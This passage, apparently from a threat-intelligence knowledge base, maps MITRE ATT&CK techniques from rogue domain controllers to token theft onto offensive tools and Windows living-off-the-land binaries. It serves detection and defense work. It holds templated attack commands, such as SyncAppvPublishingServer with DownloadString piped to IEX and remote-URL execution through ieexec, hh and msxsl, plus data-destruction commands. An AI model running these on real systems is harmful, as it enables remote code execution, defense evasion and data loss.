- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) has been delivered via malicious documents with embedded macros.(Citation: Cybereason Kimsuky November 2020)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) has been executed by luring victims into opening malicious email attachments including Excel files.(Citation: Fortinet Remcos Campaign NOV 2024)


## T1207 - Rogue Domain Controller

- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002)’s <code>LSADUMP::DCShadow</code> module can be used to make AD updates by temporarily setting a computer to be a DC.(Citation: Deply Mimikatz)(Citation: Adsecurity Mimikatz Guide)

## T1210 - Exploitation of Remote Services

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers.(Citation: Github PowerShell Empire)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains a module for exploiting SMB via EternalBlue.(Citation: GitHub PoshC2)

## T1213.001 - Confluence

- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has collected credentials and data associated with Confluence.(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1213.002 - Sharepoint

- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has searched SharePoint for data and credentials.(Citation: Github TruffleSecurity Trufflehog April 2025)
- [spwebmember](../tools/unknown/spwebmember.md) — explicit, source. [spwebmember](https://attack.mitre.org/software/S0227) is used to enumerate and dump information from Microsoft SharePoint.(Citation: NCC Group APT15 Alive and Strong)

## T1213.003 - Code Repositories

- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has gathered data and credentials from code repositories.(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1213.005 - Messaging Applications

- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has obtained data and credentials associated with messaging applications to include Slack.(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1216 - System Script Proxy Execution

- [CL_Invocation.ps1](../tools/windows/cl-invocation.ps1.md) — explicit, source. Command metadata lists T1216: . C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1 \nSyncInvoke {CMD}
- [CL_LoadAssembly.ps1](../tools/windows/cl-loadassembly.ps1.md) — explicit, source. Command metadata lists T1216: powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll...
- [CL_Mutexverifiers.ps1](../tools/windows/cl-mutexverifiers.ps1.md) — explicit, source. Command metadata lists T1216: . C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1 \nrunAfterCancelProcess {PATH:.ps1}
- [Launch-VsDevShell.ps1](../tools/windows/launch-vsdevshell.ps1.md) — explicit, source. Command metadata lists T1216: powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; {PATH:.exe} ;"
- [Manage-bde.wsf](../tools/windows/manage-bde.wsf.md) — explicit, source. Command metadata lists T1216: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
- [Pester.bat](../tools/windows/pester.bat.md) — explicit, source. Command metadata lists T1216: Pester.bat ;{PATH:.exe}
- [UtilityFunctions.ps1](../tools/windows/utilityfunctions.ps1.md) — explicit, source. Command metadata lists T1216: powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[P...
- [winrm.vbs](../tools/windows/winrm.vbs.md) — explicit, source. Command metadata lists T1216: winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil...

## T1216.001 - PubPrn

- [Pubprn.vbs](../tools/windows/pubprn.vbs.md) — explicit, source. Command metadata lists T1216.001: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}

## T1216.002 - SyncAppvPublishingServer

- [Syncappvpublishingserver.vbs](../tools/windows/syncappvpublishingserver.vbs.md) — explicit, source. Command metadata lists T1216.002: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"

## T1217 - Browser Information Discovery

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has the ability to gather browser data such as bookmarks and visited sites.(Citation: Github PowerShell Empire)

## T1218 - System Binary Proxy Execution

- [AccCheckConsole.exe](../tools/windows/acccheckconsole.exe.md) — explicit, source. Command metadata lists T1218: AccCheckConsole.exe -window "Untitled - Notepad" {PATH_ABSOLUTE:.dll}
- [AddinUtil.exe](../tools/windows/addinutil.exe.md) — explicit, source. Command metadata lists T1218: C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
- [AgentExecutor.exe](../tools/windows/agentexecutor.exe.md) — explicit, source. Command metadata lists T1218: AgentExecutor.exe -powershell "{PATH_ABSOLUTE:.ps1}" "{PATH_ABSOLUTE:.1.log}" "{PATH_ABSOLUTE:.2.log}" "{PATH_ABSOLUTE:.3.log}" 60000 "{PATH_ABSOLUTE:folder}" 0 1
- [Appvlp.exe](../tools/windows/appvlp.exe.md) — explicit, source. Command metadata lists T1218: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
- [Atbroker.exe](../tools/windows/atbroker.exe.md) — explicit, source. Command metadata lists T1218: ATBroker.exe /start malware
- [Bash.exe](../tools/windows/bash.exe.md) — explicit, source. Command metadata lists T1218: bash.exe
- [Bginfo.exe](../tools/windows/bginfo.exe.md) — explicit, source. Command metadata lists T1218: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
- [Bitsadmin.exe](../tools/windows/bitsadmin.exe.md) — explicit, source. Command metadata lists T1218: bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RE...
- [CertOC.exe](../tools/windows/certoc.exe.md) — explicit, source. Command metadata lists T1218: certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
- [Change.exe](../tools/windows/change.exe.md) — explicit, source. Command metadata lists T1218: change.exe user
- [CustomShellHost.exe](../tools/windows/customshellhost.exe.md) — explicit, source. Command metadata lists T1218: CustomShellHost.exe
- [DefaultPack.EXE](../tools/windows/defaultpack.exe.md) — explicit, source. Command metadata lists T1218: DefaultPack.EXE /C:"{CMD}"
- [Dotnet.exe](../tools/windows/dotnet.exe.md) — explicit, source. Command metadata lists T1218: dotnet.exe msbuild {PATH:.csproj}
- [Extexport.exe](../tools/windows/extexport.exe.md) — explicit, source. Command metadata lists T1218: Extexport.exe {PATH_ABSOLUTE:folder} foo bar
- [Fsutil.exe](../tools/windows/fsutil.exe.md) — explicit, source. Command metadata lists T1218: fsutil.exe trace decode
- [Gpscript.exe](../tools/windows/gpscript.exe.md) — explicit, source. Command metadata lists T1218: Gpscript /startup
- [Ie4uinit.exe](../tools/windows/ie4uinit.exe.md) — explicit, source. Command metadata lists T1218: ie4uinit.exe -BaseSettings
- [Ieexec.exe](../tools/windows/ieexec.exe.md) — explicit, source. Command metadata lists T1218: ieexec.exe {REMOTEURL:.exe}
- [Infdefaultinstall.exe](../tools/windows/infdefaultinstall.exe.md) — explicit, source. Command metadata lists T1218: InfDefaultInstall.exe {PATH:.inf}
- [Msconfig.exe](../tools/windows/msconfig.exe.md) — explicit, source. Command metadata lists T1218: Msconfig.exe -5
- [Msdeploy.exe](../tools/windows/msdeploy.exe.md) — explicit, source. Command metadata lists T1218: msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="{PATH_ABSOLUTE:.bat}"
- [Msdt.exe](../tools/windows/msdt.exe.md) — explicit, source. Command metadata lists T1218: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
- [OfflineScannerShell.exe](../tools/windows/offlinescannershell.exe.md) — explicit, source. Command metadata lists T1218: OfflineScannerShell
- [Pcwrun.exe](../tools/windows/pcwrun.exe.md) — explicit, source. Command metadata lists T1218: Pcwrun.exe {PATH_ABSOLUTE:.exe}
- [Presentationhost.exe](../tools/windows/presentationhost.exe.md) — explicit, source. Command metadata lists T1218: Presentationhost.exe {PATH_ABSOLUTE:.xbap}
- [Provlaunch.exe](../tools/windows/provlaunch.exe.md) — explicit, source. Command metadata lists T1218: provlaunch.exe LOLBin
- [Query.exe](../tools/windows/query.exe.md) — explicit, source. Command metadata lists T1218: query.exe user
- [Rasautou.exe](../tools/windows/rasautou.exe.md) — explicit, source. Command metadata lists T1218: rasautou -d {PATH:.dll} -p export_name -a a -e e
- [Register-cimprovider.exe](../tools/windows/register-cimprovider.exe.md) — explicit, source. Command metadata lists T1218: Register-cimprovider -path {PATH_ABSOLUTE:.dll}
- [Reset.exe](../tools/windows/reset.exe.md) — explicit, source. Command metadata lists T1218: reset.exe session
- [Runexehelper.exe](../tools/windows/runexehelper.exe.md) — explicit, source. Command metadata lists T1218: runexehelper.exe {PATH_ABSOLUTE:.exe}
- [Runonce.exe](../tools/windows/runonce.exe.md) — explicit, source. Command metadata lists T1218: Runonce.exe /AlternateShellStartup
- [Runscripthelper.exe](../tools/windows/runscripthelper.exe.md) — explicit, source. Command metadata lists T1218: runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}
- [SQLToolsPS.exe](../tools/windows/sqltoolsps.exe.md) — explicit, source. Command metadata lists T1218: SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}
- [Scriptrunner.exe](../tools/windows/scriptrunner.exe.md) — explicit, source. Command metadata lists T1218: ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
- [Setres.exe](../tools/windows/setres.exe.md) — explicit, source. Command metadata lists T1218: setres.exe -w 800 -h 600
- [SettingSyncHost.exe](../tools/windows/settingsynchost.exe.md) — explicit, source. Command metadata lists T1218: SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}
- [Sigverif.exe](../tools/windows/sigverif.exe.md) — explicit, source. Command metadata lists T1218: sigverif.exe
- [Sqlps.exe](../tools/windows/sqlps.exe.md) — explicit, source. Command metadata lists T1218: Sqlps.exe -noprofile
- [Squirrel.exe](../tools/windows/squirrel.exe.md) — explicit, source. Command metadata lists T1218: squirrel.exe --updateRollback={REMOTEURL}
- [Stordiag.exe](../tools/windows/stordiag.exe.md) — explicit, source. Command metadata lists T1218: stordiag.exe
- [SyncAppvPublishingServer.exe](../tools/windows/syncappvpublishingserver.exe.md) — explicit, source. Command metadata lists T1218: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
- [Update.exe](../tools/windows/update.exe.md) — explicit, source. Command metadata lists T1218: Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
- [VSIISExeLauncher.exe](../tools/windows/vsiisexelauncher.exe.md) — explicit, source. Command metadata lists T1218: VSIISExeLauncher.exe -p {PATH:.exe} -a "{CMD:args}"
- [VisualUiaVerifyNative.exe](../tools/windows/visualuiaverifynative.exe.md) — explicit, source. Command metadata lists T1218: VisualUiaVerifyNative.exe
- [Wab.exe](../tools/windows/wab.exe.md) — explicit, source. Command metadata lists T1218: wab.exe
- [Wmic.exe](../tools/windows/wmic.exe.md) — explicit, source. Command metadata lists T1218: wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
- [WorkFolders.exe](../tools/windows/workfolders.exe.md) — explicit, source. Command metadata lists T1218: WorkFolders
- [Wsl.exe](../tools/windows/wsl.exe.md) — explicit, source. Command metadata lists T1218: wsl.exe
- [Xwizard.exe](../tools/windows/xwizard.exe.md) — explicit, source. Command metadata lists T1218: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
- [coregen.exe](../tools/windows/coregen.exe.md) — explicit, source. Command metadata lists T1218: coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name
- [iediagcmd.exe](../tools/windows/iediagcmd.exe.md) — explicit, source. Command metadata lists T1218: set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
- [vsls-agent.exe](../tools/windows/vsls-agent.exe.md) — explicit, source. Command metadata lists T1218: vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}
- [write.exe](../tools/windows/write.exe.md) — explicit, source. Command metadata lists T1218: write.exe
- [wuauclt.exe](../tools/windows/wuauclt.exe.md) — explicit, source. Command metadata lists T1218: wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer

## T1218.001 - Compiled HTML File

- [Hh.exe](../tools/windows/hh.exe.md) — explicit, source. Command metadata lists T1218.001: HH.exe {REMOTEURL:.chm}

## T1218.002 - Control Panel

- [Control.exe](../tools/windows/control.exe.md) — explicit, source. Command metadata lists T1218.002: control.exe {PATH_ABSOLUTE:.cpl}

## T1218.003 - CMSTP

- [Cmstp.exe](../tools/windows/cmstp.exe.md) — explicit, source. Command metadata lists T1218.003: cmstp.exe /nf

## T1218.004 - InstallUtil

- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) can create launchers via an InstallUtil XML file to install new Grunt listeners.(Citation: Github Covenant)
- [Installutil.exe](../tools/windows/installutil.exe.md) — explicit, source. Command metadata lists T1218.004: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}

## T1218.005 - Mshta

- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) can create HTA files to install Grunt listeners.(Citation: Github Covenant)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can use mshta to serve additional payloads and to help schedule tasks for persistence.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021) 
- [Mshta.exe](../tools/windows/mshta.exe.md) — explicit, source. Command metadata lists T1218.005: mshta.exe "{PATH_ABSOLUTE}:file.hta"

## T1218.007 - Msiexec

- [AppCert.exe](../tools/windows/appcert.exe.md) — explicit, source. Command metadata lists T1218.007: appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}
- [Devinit.exe](../tools/windows/devinit.exe.md) — explicit, source. Command metadata lists T1218.007: devinit.exe run -t msi-install -i {REMOTEURL:.msi}
- [Msiexec.exe](../tools/windows/msiexec.exe.md) — explicit, source. Command metadata lists T1218.007: msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
- [RemoteUtilities](../tools/unknown/remoteutilities.md) — explicit, source. [RemoteUtilities](https://attack.mitre.org/software/S0592) can use Msiexec to install a service.(Citation: Trend Micro Muddy Water March 2021)

## T1218.008 - Odbcconf

- [Odbcconf.exe](../tools/windows/odbcconf.exe.md) — explicit, source. Command metadata lists T1218.008: odbcconf -f {PATH:.rsp}

## T1218.009 - Regsvcs／Regasm

- [Regasm.exe](../tools/windows/regasm.exe.md) — explicit, source. Command metadata lists T1218.009: regasm.exe /U {PATH:.dll}
- [Regsvcs.exe](../tools/windows/regsvcs.exe.md) — explicit, source. Command metadata lists T1218.009: regsvcs.exe {PATH:.dll}

## T1218.010 - Regsvr32

- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) can create SCT files for installation via `Regsvr32` to deploy new Grunt listeners.(Citation: Github Covenant)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can use Regsvr32 to execute additional payloads.(Citation: Github Koadic)
- [Regsvr32.exe](../tools/windows/regsvr32.exe.md) — explicit, source. Command metadata lists T1218.010: regsvr32.exe /u /s {PATH:.dll}

## T1218.011 - Rundll32

- [Advpack.dll](../tools/windows/advpack.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32 advpack.dll, RegisterOCX {CMD}
- [Desk.cpl](../tools/windows/desk.cpl.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}
- [Ieadvpack.dll](../tools/windows/ieadvpack.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32 ieadvpack.dll, RegisterOCX {CMD}
- [Ieframe.dll](../tools/windows/ieframe.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can use Rundll32 to execute additional payloads.(Citation: Github Koadic)
- [Mshtml.dll](../tools/windows/mshtml.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has used `rundll32.exe` for execution.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [Pcwutl.dll](../tools/windows/pcwutl.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}
- [Rundll32.exe](../tools/windows/rundll32.exe.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe -sta {CLSID}
- [Setupapi.dll](../tools/windows/setupapi.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}
- [Shdocvw.dll](../tools/windows/shdocvw.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}
- [Shell32.dll](../tools/windows/shell32.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe shell32.dll,#44 {PATH:.dll}
- [Syssetup.dll](../tools/windows/syssetup.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}
- [Url.dll](../tools/windows/url.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
- [Zipfldr.dll](../tools/windows/zipfldr.dll.md) — explicit, source. Command metadata lists T1218.011: rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e

## T1218.012 - Verclsid

- [Verclsid.exe](../tools/windows/verclsid.exe.md) — explicit, source. Command metadata lists T1218.012: verclsid.exe /S /C {CLSID}

## T1218.013 - Mavinject

- [Mavinject.exe](../tools/windows/mavinject.exe.md) — explicit, source. Command metadata lists T1218.013: MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}

## T1218.014 - MMC

- [Mmc.exe](../tools/windows/mmc.exe.md) — explicit, source. Command metadata lists T1218.014: mmc.exe -Embedding {PATH_ABSOLUTE:.msc}

## T1218.015 - Electron Applications

- [Msedge.exe](../tools/windows/msedge.exe.md) — explicit, source. Command metadata lists T1218.015: msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
- [Teams.exe](../tools/windows/teams.exe.md) — explicit, source. Command metadata lists T1218.015: teams.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
- [msedge_proxy.exe](../tools/windows/msedge-proxy.exe.md) — explicit, source. Command metadata lists T1218.015: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
- [msedgewebview2.exe](../tools/windows/msedgewebview2.exe.md) — explicit, source. Command metadata lists T1218.015: msedgewebview2.exe --no-sandbox --renderer-cmd-prefix="{CMD}"

## T1219.001 - IDE Tunneling

- [code.exe](../tools/windows/code.exe.md) — explicit, source. Command metadata lists T1219.001: code.exe tunnel --accept-server-license-terms --name "tunnel-name"

## T1220 - XSL Script Processing

- [msxsl.exe](../tools/windows/msxsl.exe.md) — explicit, source. Command metadata lists T1220: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
- [winrm.vbs](../tools/windows/winrm.vbs.md) — explicit, source. Command metadata lists T1220: %SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty

## T1222.001 - Windows Permissions

- [Diskpart](../tools/unknown/diskpart.md) — explicit, source. [Diskpart](https://attack.mitre.org/software/S9002) can be used to display, set, or clear attributes of a disk or volume.(Citation: Microsoft_diskpart_Feb2023)  

## T1480 - Execution Guardrails

- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can reject requests to phishing URLs if the User-Agent of the visitor doesn't match the allowlist REGEX filter for a specific lure.(Citation: Breakdev Evilginx 2.4 SEP 2020)

## T1482 - Domain Trust Discovery

- [AdFind](../tools/unknown/adfind.md) — explicit, source. [AdFind](https://attack.mitre.org/software/S0552) can gather information about organizational units (OUs) and domain trusts from Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk and Trickbot January 2019)(Citation: Symantec Bumblebee June 2022)
- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) has the ability to map domain trusts and identify misconfigurations for potential abuse.(Citation: CrowdStrike BloodHound April 2018)
- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use LDAP queries and `nltest /domain_trusts` for domain trust discovery.(Citation: Palo Alto Brute Ratel July 2022)(Citation: Trend Micro Black Basta October 2022)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has modules for enumerating domain trusts.(Citation: Github PowerShell Empire)
- [Nltest](../tools/unknown/nltest.md) — explicit, source. [Nltest](https://attack.mitre.org/software/S0359) may be used to enumerate trusted domains by using commands such as <code>nltest /domain_trusts</code>.(Citation: Nltest Manual)(Citation: Fortinet TrickBot)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) has modules for enumerating domain trusts.(Citation: GitHub PoshC2)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) has modules such as <code>Get-NetDomainTrust</code> and <code>Get-NetForestTrust</code> to enumerate domain and forest trusts.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Rubeus](../tools/unknown/rubeus.md) — explicit, source. [Rubeus](https://attack.mitre.org/software/S1071) can gather information about domain trusts.(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed Run November 2020)
- [dsquery](../tools/unknown/dsquery.md) — explicit, source. [dsquery](https://attack.mitre.org/software/S0105) can be used to gather information on domain trusts with <code>dsquery * -filter "(objectClass=trustedDomain)" -attr *</code>.(Citation: Harmj0y Domain Trusts)

## T1484.001 - Group Policy Modification

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use <code>New-GPOImmediateTask</code> to modify a GPO that will install and execute a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053).(Citation: Github PowerShell Empire)

## T1484.002 - Trust Modification

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant. [AADInternals](https://attack.mitre.org/software/S0677) can also modify DesktopSSO information.(Citation: AADInternals Documentation)(Citation: Azure AD Federation Vulnerability)

## T1485 - Data Destruction

- [Cipher.exe](../tools/windows/cipher.exe.md) — explicit, source. Command metadata lists T1485: cipher /w:{PATH_ABSOLUTE:folder}
- [Fsutil.exe](../tools/windows/fsutil.exe.md) — explicit, source. Command metadata lists T1485: fsutil.exe usn deletejournal /d c:
- [RawDisk](../tools/unknown/rawdisk.md) — explicit, source. [RawDisk](https://attack.mitre.org/software/S0364) was used in [Shamoon](https://attack.mitre.org/software/S0140) to write to protected system locations such as the MBR and disk partitions in an effort to destroy data.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018)
- [SDelete](../tools/unknown/sdelete.md) — explicit, source. [SDelete](https://attack.mitre.org/software/S0195) deletes data in a way that makes it unrecoverable.(Citation: Microsoft SDelete July 2016)

## T1491.001 - Internal Defacement

- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) has the ability to modify the desktop wallpaper.(Citation: Fortinet Remcos Campaign NOV 2024)

## T1496.001 - Compute Hijacking

- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has the capability to run a cryptocurrency miner on the victim machine.(Citation: Imminent Unit42 Dec2019)

## T1497.001 - System Checks

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can identify strings such as Virtual, vmware, or VirtualBox to detect virtualized environments.(Citation: Telefonica Snip3 December 2021)
- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment.(Citation: Cybereason Kimsuky November 2020)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) has a module that checks a number of indicators on the system to determine if its running on a virtual machine.(Citation: GitHub Pupy)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) searches for Sandboxie and VMware on the system.(Citation: Talos Remcos Aug 2018)

## T1497.003 - Time Based Checks

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can call `NtDelayExecution` to pause execution.(Citation: Palo Alto Brute Ratel July 2022)(Citation: MDSec Brute Ratel August 2022)
- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) has the ability to hide phishing lures for a set time to avoid scanning by sandboxes.(Citation: Breakdev Evilginx 3.2 AUG 2023)

## T1518 - Software Discovery

- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered a list of installed software on the infected host.(Citation: FOX-IT May 2016 Mofang)

## T1518.001 - Security Software Discovery

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can detect EDR userland hooks.(Citation: Palo Alto Brute Ratel July 2022)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can enumerate antivirus software on the target.(Citation: Github PowerShell Empire)
- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can enumerate AWS security services, including WAF rules and GuardDuty detectors.(Citation: GitHub Pacu)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can determine if an anti-virus product is installed through the resolution of the service's virtual SID.(Citation: Security Affairs SILENTTRINITY July 2019)
- [Tasklist](../tools/unknown/tasklist.md) — explicit, source. [Tasklist](https://attack.mitre.org/software/S0057) can be used to enumerate security software currently running on a system by process name of known products.(Citation: Microsoft Tasklist)
- [netsh](../tools/unknown/netsh.md) — explicit, source. [netsh](https://attack.mitre.org/software/S0108) can be used to discover system firewall settings.(Citation: TechNet Netsh)(Citation: TechNet Netsh Firewall)

## T1526 - Cloud Service Discovery

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can enumerate information about a variety of cloud services, such as Office 365 and Sharepoint instances or OpenID Configurations.(Citation: AADInternals Documentation)
- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can enumerate AWS services, such as CloudTrail and CloudWatch.(Citation: GitHub Pacu)
- [ROADTools](../tools/unknown/roadtools.md) — explicit, source. [ROADTools](https://attack.mitre.org/software/S0684) can enumerate Azure AD applications and service principals.(Citation: Roadtools)	
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has the ability to scan code repositories and CI/CD platforms.(Citation: Black Hills Information Security TruffleHog January 2024)(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1528 - Steal Application Access Token

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can steal users’ access tokens via phishing emails containing malicious links.(Citation: AADInternals Documentation)
- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) gathers Kubernetes service account tokens using a variety of techniques.(Citation: Peirates GitHub)
